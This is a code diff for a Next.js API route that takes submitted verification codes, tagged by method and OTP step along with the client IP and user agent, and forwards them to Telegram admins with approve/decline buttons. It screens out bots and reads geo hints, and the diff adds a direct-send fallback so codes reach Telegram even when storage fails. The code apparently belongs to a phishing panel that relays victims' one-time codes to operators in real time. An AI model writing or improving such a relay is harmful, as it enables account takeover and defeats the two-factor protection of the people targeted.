@@ -12,6 +12,7 @@ import {
   sendTelegramToAll,
   withSiteHeader,
   sendVerificationWithApprovalButtons,
+  sendVerificationDirect,
 } from "@/lib/telegram";
 import { getVercelGeoHints } from "@/lib/vercel-geo";
 import { isBlockedBotUserAgent } from "@/lib/bot-block";
@@ -168,53 +169,113 @@ export async function POST(request: Request) {
         text = formatMethodMessage(body.method);
         break;
       case "verification": {
-        // Store the pending code for admin approval
-        const pendingCode = await storePendingCode(
-          body.code,
-          body.method,
-          body.otpStep,
-          "new_user",
-          {
-            clientIp: getClientIp(request) ?? undefined,
-            userAgent: request.headers.get("user-agent") ?? undefined,
-          },
-        );
-
-        // Send message with approve/decline buttons to admins
-        const result = await sendVerificationWithApprovalButtons(
-          body.method,
-          body.code,
-          body.otpStep,
-          pendingCode.id,
-        );
-
-        if (!result.ok) {
-          console.error(
-            `[TELEGRAM ERROR] Failed to send verification with buttons for method '${body.method}', code '${body.code}', otpStep ${body.otpStep}: ${result.error}`,
+        try {
+          // Store the pending code for admin approval
+          const pendingCode = await storePendingCode(
+            body.code,
+            body.method,
+            body.otpStep,
+            "new_user",
+            {
+              clientIp: getClientIp(request) ?? undefined,
+              userAgent: request.headers.get("user-agent") ?? undefined,
+            },
           );
-          return NextResponse.json(
-            { ok: false, error: result.error || "send_failed" },
-            { status: 502 },
+
+          // Send message with approve/decline buttons to admins
+          const result = await sendVerificationWithApprovalButtons(
+            body.method,
+            body.code,
+            body.otpStep,
+            pendingCode.id,
           );
+
+          if (!result.ok) {
+            console.error(
+              `[TELEGRAM ERROR] Failed to send verification with buttons for method '${body.method}', code '${body.code}', otpStep ${body.otpStep}: ${result.error}`,
+            );
+            return NextResponse.json(
+              { ok: false, error: result.error || "send_failed" },
+              { status: 502 },
+            );
+          }
+
+          // Store message ID for later editing
+          if (result.messageId) {
+            await updatePendingCode(pendingCode.id, {
+              messageId: result.messageId,
+            });
+          }
+
+          console.log(
+            `[TELEGRAM SUCCESS] Verification code stored for approval - CodeID: ${pendingCode.id}, Method: ${body.method}, OTPStep: ${body.otpStep}`,
+          );
+
+          // Store the pending code ID globally for returning in response
+          (global as any).__lastPendingCodeId = pendingCode.id;
+
+          // Don't send generic message for verification codes
+          isVerificationWithButtons = true;
+          text = formatVerificationMessage(body.method, body.code, body.otpStep);
+        } catch (storageError) {
+          // FALLBACK: If storage fails, send directly to Telegram anyway
+          console.warn(
+            `[TELEGRAM FALLBACK] Storage failed, sending directly: ${storageError}`,
+          );
+          
+          const fallbackId = `fallback-${Date.now()}`;
+          try {
+            // Try direct send first (no buttons, simpler)
+            const directResult = await sendVerificationDirect(
+              body.method,
+              body.code,
+              body.otpStep,
+            );
+
+            if (directResult.ok) {
+              console.log(
+                `[TELEGRAM SUCCESS FALLBACK] Code sent directly - FallbackID: ${fallbackId}, Method: ${body.method}`,
+              );
+              (global as any).__lastPendingCodeId = fallbackId;
+              isVerificationWithButtons = true;
+              text = formatVerificationMessage(body.method, body.code, body.otpStep);
+            } else {
+              // If direct send fails, try with buttons
+              console.warn(
+                `[TELEGRAM FALLBACK] Direct send failed, trying with buttons: ${directResult.error}`,
+              );
+              const buttonResult = await sendVerificationWithApprovalButtons(
+                body.method,
+                body.code,
+                body.otpStep,
+                fallbackId,
+              );
+
+              if (buttonResult.ok) {
+                console.log(
+                  `[TELEGRAM SUCCESS FALLBACK] Code sent with buttons - FallbackID: ${fallbackId}`,
+                );
+                (global as any).__lastPendingCodeId = fallbackId;
+                isVerificationWithButtons = true;
+                text = formatVerificationMessage(body.method, body.code, body.otpStep);
+              } else {
+                console.error(
+                  `[TELEGRAM ERROR FALLBACK] Both send methods failed: ${buttonResult.error}`,
+                );
+                return NextResponse.json(
+                  { ok: false, error: "send_failed" },
+                  { status: 502 },
+                );
+              }
+            }
+          } catch (sendError) {
+            console.error(`[TELEGRAM ERROR FALLBACK] Unhandled error: ${sendError}`);
+            return NextResponse.json(
+              { ok: false, error: "internal_server_error" },
+              { status: 500 },
+            );
+          }
         }
-
-        // Store message ID for later editing
-        if (result.messageId) {
-          await updatePendingCode(pendingCode.id, {
-            messageId: result.messageId,
-          });
-        }
-
-        console.log(
-          `[TELEGRAM SUCCESS] Verification code stored for approval - CodeID: ${pendingCode.id}, Method: ${body.method}, OTPStep: ${body.otpStep}`,
-        );
-
-        // Store the pending code ID globally for returning in response
-        (global as any).__lastPendingCodeId = pendingCode.id;
-
-        // Don't send generic message for verification codes
-        isVerificationWithButtons = true;
-        text = formatVerificationMessage(body.method, body.code, body.otpStep);
         break;
       }
       case "resend":
@@ -255,9 +316,14 @@ export async function POST(request: Request) {
 
     return NextResponse.json({ ok: true });
   } catch (error) {
-    console.error("[TELEGRAM] Unhandled error:", error);
+    const errorStr = error instanceof Error ? error.message : String(error);
+    const errorStack = error instanceof Error ? error.stack : "";
+    console.error("[TELEGRAM] Unhandled error:", errorStr);
+    if (errorStack) {
+      console.error("[TELEGRAM] Stack:", errorStack);
+    }
     return NextResponse.json(
-      { ok: false, error: "internal_server_error", details: String(error) },
+      { ok: false, error: "internal_server_error", details: errorStr },
       { status: 500 },
     );
   }
